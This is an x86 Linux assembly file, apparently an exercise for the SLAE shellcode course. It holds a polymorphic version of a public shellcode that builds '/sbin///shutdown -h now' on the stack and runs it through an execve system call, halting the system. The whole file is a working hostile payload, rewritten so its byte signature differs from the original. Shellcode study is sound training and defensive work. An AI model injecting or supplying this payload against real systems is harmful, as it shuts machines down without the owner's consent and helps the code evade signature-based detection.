; linux/x86 shutdown -h now, 56 bytes originally
; original: http://shell-storm.org/shellcode/files/shellcode-876.php
; polymorphic for SLAE
 
section .text
        global _start
 
_start:
	sub edx,edx
	mul edx
	push edx
	push byte 0x68
	push byte 0x2d
	sub eax,edx
	mov edi,esp
	mov dword [esp - 4],eax
	sub esp,4
	push 0x6e
	push word 0x776f
	pop word [esp + 0x1]
	push esp
	pop edi
	mov dword [esp - 4],eax
	mov dword [esp - 8],0x6e776f64
	mov dword [esp - 12],0x74756873
	mov dword [esp - 16],0x2f2f2f6e
	mov dword [esp - 20],0x6962732f
	sub esp,20	
	push esp
	pop ebx
	push edx
	push esi
	push edi
	push ebx
	push esp
	pop ecx
	push byte 0xb
	pop eax
	int 0x80
